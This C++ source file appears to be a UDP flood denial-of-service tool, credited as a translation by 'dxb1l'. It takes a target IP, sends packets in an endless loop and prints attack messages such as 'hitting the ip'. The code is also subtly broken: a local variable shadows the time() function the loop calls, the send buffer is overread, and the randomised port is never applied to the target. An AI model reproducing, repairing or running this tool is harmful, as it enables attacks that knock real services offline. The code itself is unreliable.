#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

using namespace std;

int main(int argc, char* argv[]) {
    if (argc < 2) {
        cerr << "Usage: " << argv[0] << " <target_ip>" << endl;
        return 1;
    }

    srand(time(nullptr));

    int port = 0;
    int size = 0;
    int time = 0;
    int bw = 0;
    int delay = 0;

    if (argc > 2) {
        cerr << "WARNING: Additional parameters are not supported in this translation." << endl;
    }

    string ip = argv[1];

    sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(targetAddr.sin_addr));

    int endTime = (time != 0) ? time : 1000000;
    int bwKbps = (bw * size) / 8;
    int pSize;
    int pPort;

    cout << ">> This version of the script was translated to C++ by dxb1l" << endl;
    cout << ">> hitting the ip" << endl;
    cout << ">> hitting the ports" << endl;
    cout << (size ? to_string(size) + "-byte " : "") << (time ? "" : "") << endl;
    cout << "Interpacket delay " << delay << " msec" << endl;
    cout << "Total IP bandwidth " << bwKbps << " kbps" << endl;

    cout << ">> Press CTRL+C to stop the attack" << endl;

    if (size && (size < 64 || size > 1500)) {
        cerr << "Invalid package size: " << size << endl;
        return 1;
    }

    for (time_t currentTime = time(nullptr); currentTime <= endTime; currentTime = time(nullptr)) {
        pSize = (size != 0) ? size : rand() % (1024 - 64) + 64;
        pPort = (port != 0) ? port : rand() % 65500 + 1;

        sockaddr_in sourceAddr;
        sourceAddr.sin_family = AF_INET;
        sourceAddr.sin_port = htons(pPort);
        sourceAddr.sin_addr.s_addr = INADDR_ANY;

        int sock = socket(AF_INET, SOCK_DGRAM, 0);

        if (sock < 0) {
            cerr << "Error creating socket" << endl;
            return 1;
        }

        sendto(sock, "flood", pSize, 0, (struct sockaddr*)&targetAddr, sizeof(targetAddr));
        usleep(1000 * delay);

        close(sock);
    }

    return 0;
}
